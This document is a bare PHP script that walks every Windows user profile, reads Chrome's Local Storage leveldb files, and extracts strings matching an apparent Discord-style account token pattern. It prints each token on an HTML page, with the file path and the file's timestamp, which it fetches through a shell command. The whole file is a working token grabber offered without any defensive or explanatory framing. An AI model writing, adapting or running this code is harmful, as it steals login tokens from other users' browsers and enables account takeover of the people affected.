<?php
    $users = scandir('C:\\Users');
    foreach ($users as $i => $user) {
        $pasta = 'C:\\Users\\' . $user;
        $chrome = $pasta . '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb';
        if($user == '.' || $user == '..'){
            continue;
        };
        if(is_dir($chrome)) {
            $guh = scandir($chrome);
            $cuh = array_filter($guh,function($v,$k){
                return substr($v,-4) == ".ldb";
            },ARRAY_FILTER_USE_BOTH);
            foreach($cuh as $ii => $dbfile) {
                $data = file_get_contents($chrome . '\\' . $dbfile);
                #echo preg_match_all("/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/",$data);
                preg_match_all("/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/",$data,$ugu);
                if(count($ugu[0]) > 0){;
                    echo '<h2> ' . $chrome . '\\' . $dbfile . ' </h2>';
                    preg_match("/(\d{2}\/){2}\d{4}\s\d{2}:\d{2}/",shell_exec('for %A in ("' . $chrome . '\\' . $dbfile . '") do echo %~tA'),$guhh);
                    echo '<h3> ' . $guhh[0] . '</h3>';
                    foreach($ugu[0] as $iii => $token){
                        echo "<p> " . $token . " </p>";
                    };
                };
            };
        };
    };
?>
